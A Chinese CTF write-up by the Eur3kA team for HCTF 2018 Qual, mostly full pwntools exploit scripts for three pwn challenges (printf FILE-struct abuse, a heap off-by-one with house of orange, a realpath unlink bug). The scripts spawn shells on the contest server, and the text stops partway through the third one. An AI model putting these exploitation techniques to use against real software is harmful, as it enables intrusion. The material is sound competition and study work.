> 我们是Eur3kA战队，也是联合战队r3kapig的r3ka，我们成立于HCTF 2017 Qual 前夕并夺得HCTF 2017
> Qual冠军。这周末我们参与了HCTF 2018 Qual并成功卫冕。  
>  我们战队长期招新，尤其是misc/crypto/web方向，我们非常期待新的大佬加入并一起冲击明年的DEFCON
> CTF。感兴趣的大佬请联系PI:EMAIL。
## Pwn
### Printf
给了binary的地址，又可以控制`stdout`, 为所欲为啊
  1. leak libc
  2. 利用file struct来任意地址写
    from pwn import *
    local=0
    pc='./babyprintf_ver2'
    remote_addr=['150.109.44.250',20005]
    aslr=True
    context.log_level=True
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    if local==1:
        #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
        p = process(pc,aslr=aslr)
        gdb.attach(p,'c')
    else:
        p=remote(remote_addr[0],remote_addr[1])
    ru = lambda x : p.recvuntil(x)
    sn = lambda x : p.send(x)
    rl = lambda   : p.recvline()
    sl = lambda x : p.sendline(x)
    rv = lambda x : p.recv(x)
    sa = lambda a,b : p.sendafter(a,b)
    sla = lambda a,b : p.sendlineafter(a,b)
    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    def raddr(a=6):
        if(a==6):
            return u64(rv(a).ljust(8,'\x00'))
        else:
            return u64(rl().strip('\n').ljust(8,'\x00'))
    if __name__ == '__main__':
        sla("token:","DN2WQ9iOvvAGyRxDC4KweQ2L9hAlhr6j")
        ru("location to ")
        codebase=int(rl().strip("\n"),16)-0x202010
        buf=codebase+0x202010
        lg("Code base",codebase)
        fake_stdout=p64(0xfbad2084)+p64(0)*8
        fake_stdout=fake_stdout.ljust(112,'\x00')
        fake_stdout+=p64(0x1)
        fake_stdout=fake_stdout.ljust(0x88,'\x00')
        fake_stdout+=p64(buf+0x300)
        fake_stdout=fake_stdout.ljust(216,'\x00')
        #fake_stdout+=p64(buf+0x20+224)
        fake_stdout+=cyclic(0x40)
        sl("A"*0x10+p64(buf+0x20)+'\x00'*0x8+fake_stdout)
        raw_input()
        #sl("A"*0x10+p64(buf+0x20)+'\x00'*0x8+p64(0xfbad2887)+p64(buf+0x200-0x10)*7+p64(buf+0x201-0x10)*1)
        sl("A"*0x10+p64(buf+0x20)+'\x00'*0x8+p64(0xfbad2887)+p64(0)*8)
        raw_input()
        off=0x2020b4
        sl("A"*0x10+p64(buf+0x20)+'\x00'*0x8+p64(0xfbad3c80)+p64(0)*3+p64(buf+0x30)+p64(buf+0x200))
        raw_input()
        libc_addr=u64(ru("caaadaaa")[-16:-8])
        libc.address=libc_addr-0x3e82a0
        malloc_hook=libc.symbols['__malloc_hook']
        print(hex(malloc_hook))
        lg("libc",libc_addr)
        sl("A"*0x10+p64(buf+0x20)+'\x00'*0x8+p64(0xfbad2887)+p64(0)*8)
        raw_input()
        p.clean()
        sl("A"*0x10+p64(buf+0x20)+'\x00'*0x8+p64(0xfbad3c80)+p64(0)*3+p64(libc.symbols['environ'])+p64(libc.symbols['environ']+0x8)[0:7])
        stack_addr=u64(rv(8))
        lg("stack addr",stack_addr)
        raw_input()
        fake_stdout=p64(0xfbad3c80)+p64(stack_addr-0x980)*7+p64(stack_addr-0x980+0x8)
        #fake_stdout=p64(0xfbad3c80)+p64(buf+0x20+0xd8)*7+p64(buf+0x20+0xd8+8)
        fake_stdout=fake_stdout.ljust(112,'\x00')
        fake_stdout+=p64(0x0)
        fake_stdout=fake_stdout.ljust(0x88,'\x00')
        fake_stdout+=p64(buf+0x300)+p64(0xffffffffffffffff)
        fake_stdout=fake_stdout.ljust(216,'\x00')
        #fake_stdout+=p64(buf+0x20+224)
        fake_stdout+=cyclic(0x100)
        sl("A"*0x10+p64(buf+0x20)+'\x00'*0x8+fake_stdout)
        print("Go")
        raw_input()
        sl(p64(libc.address+0x4f322))
        p.interactive()
        raw_input()
        fake_stdout=p64(0xfbad2084)+p64(0)*8
        fake_stdout=fake_stdout.ljust(112,'\x00')
        fake_stdout+=p64(0x1)
        fake_stdout=fake_stdout.ljust(0x88,'\x00')
        fake_stdout+=p64(buf+0x300)
        fake_stdout=fake_stdout.ljust(216,'\x00')
        sl("A"*0x10+p64(buf+0x20)+'\x00'*0x8+fake_stdout+cyclic(64)+p64(0xdeadbeef))
        p.interactive()
### heap storm
知道了`scanf`可以触发`malloc`后，利用`off by one`把`size`改小加上`malloc
consolidate`来构造`overlap chunk`，最后`house of orange`(写了半小时，脚本有点乱)
    from pwn import *
    local=0
    pc='./heapstorm_zero'
    remote_addr=['150.109.44.250',20001]
    aslr=False
    context.log_level=True
    context.terminal=['tmux','split','-h']
    libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
    if local==1:
        #p = process(pc,aslr=aslr,env={'LD_PRELOAD': './libc.so.6'})
        p = process(pc,aslr=aslr)
        gdb.attach(p,'c')
    else:
        p=remote(remote_addr[0],remote_addr[1])
    ru = lambda x : p.recvuntil(x)
    sn = lambda x : p.send(x)
    rl = lambda   : p.recvline()
    sl = lambda x : p.sendline(x)
    rv = lambda x : p.recv(x)
    sa = lambda a,b : p.sendafter(a,b)
    sla = lambda a,b : p.sendlineafter(a,b)
    def lg(s,addr):
        print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
    def raddr(a=6):
        if(a==6):
            return u64(rv(a).ljust(8,'\x00'))
        else:
            return u64(rl().strip('\n').ljust(8,'\x00'))
    def choice(idx):
        sla("Choice:",str(idx))
    def add(size,content):
        choice(1)
        sla(":",str(size))
        sa(":",content)
    def view(idx):
        choice(2)
        sla(":",str(idx))
    def free(idx):
        choice(3)
        sla(":",str(idx))
    if __name__ == '__main__':
        sla("token:","DN2WQ9iOvvAGyRxDC4KweQ2L9hAlhr6j")
        add(0x18,"AAA\n")
        for i in range(24):
            add(0x38,"A"*8+str(i)+"\n")
        free(0)
        free(4)
        free(5)
        free(6)
        free(7)
        free(8)
        free(9)
        sla("Choice:","1"*0x500)
        add(0x38,"B"*0x30+p64(0x120))
        add(0x38,"C"*0x30+p32(0x40)+'\n')
        add(0x38,"P"*0x30+'\n')
        free(4)
        sla("Choice:","1"*0x500)
        free(10)
        sla("Choice:","1"*0x500)
        add(0x38,"DDD\n")
        add(0x38,"KKK\n")
        add(0x38,"EEE\n")
        view(5)
        ru("Content: ")
        libc_addr=raddr(6)-0x3c4b78
        libc.address=libc_addr
        lg("libc addr",libc_addr)
        add(0x38,"GGG\n")
        free(10)
        free(11)
        free(5)
        view(8)
        ru("Content: ")
        heap=raddr(6)-0x2a0
        lg("heap addr",heap)
        for i in range(6):
            free(23-i)
        fake_struct="/bin/sh\x00"+p64(0x61)+p64(0)+p64(heap+0x430)+p64(0)+p64(1)
        add(0x38,fake_struct+'\n')
        free(17)
        add(0x38,p64(0)+p64(0x31)+p64(0)+p64(libc.symbols['_IO_list_all']-0x10)+'\n')
        add(0x38,'\x00'*0x30+'\n')
        add(0x38,'\x00'*0x30+'\n')
        add(0x38,p64(0)*3+p64(heap+0x2b0)+'\n')
        add(0x38,p64(libc.symbols['system'])*6+'\n')
        add(0x38,p64(libc.symbols['system'])*6+'\n')
        add(0x38,p64(libc.symbols['system'])*6+'\n')
        add(0x38,p64(libc.symbols['system'])*6+'\n')
        add(0x28,"DDD\n")
        add(0x28,p64(0)+p64(0x41)+"\n")
        free(6)
        add(0x38,p64(0)*3+p64(0xa1)+p64(0)+p64(heap+0x470)+'\n')
        add(0x28,'aa'+'\n')
        p.interactive()
### easyexp
用到了realpath的libc洞，往前改，改了下prev size和next chunk的size（00，所以prev not
inuse），最后unlink，
    #! /usr/bin/env python2
    # -*- coding: utf-8 -*-    # vim:fenc=utf-8
    #
    # Copyright © 2018 anciety 
    #
    # Distributed under terms of the MIT license.
    import sys
    import os
    import os.path
    from pwn import *
    context(os='linux', arch='amd64', log_level='debug')
    context.terminal = ['lxterminal', '-e']
    # synonyms for faster typing
    tube.s = tube.send
    tube.sl = tube.sendline
    tube.sa = tube.sendafter
    tube.sla = tube.sendlineafter
    tube.r = tube.recv
    tube.ru = tube.recvuntil
    tube.rl = tube.recvline
    tube.rr = tube.recvregex
    tube.irt = tube.interactive
    if len(sys.argv) > 2:
        DEBUG = 0
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
        p = remote(HOST, PORT)
        p.ru('token:')
        p.sl('DN2WQ9iOvvAGyRxDC4KweQ2L9hAlhr6j')
    else:
        DEBUG = 1
        if len(sys.argv) == 2:
            PATH = sys.argv[1]
        p = process(PATH, env={'LD_PRELOAD': './libc-2.23.so'})
    def mkfile(p, name, content):
        p.ru('$ ')
        p.sl('mkfile %s' % name)
        p.ru('something:')
        p.sl(content)
    def mkdir(p, path):
        p.ru('$ ')
        p.sl('mkdir %s' % path)
    def cat(p, path):
        p.ru('$ ')
        p.sl('cat %s' % path)
        return p.rl().strip()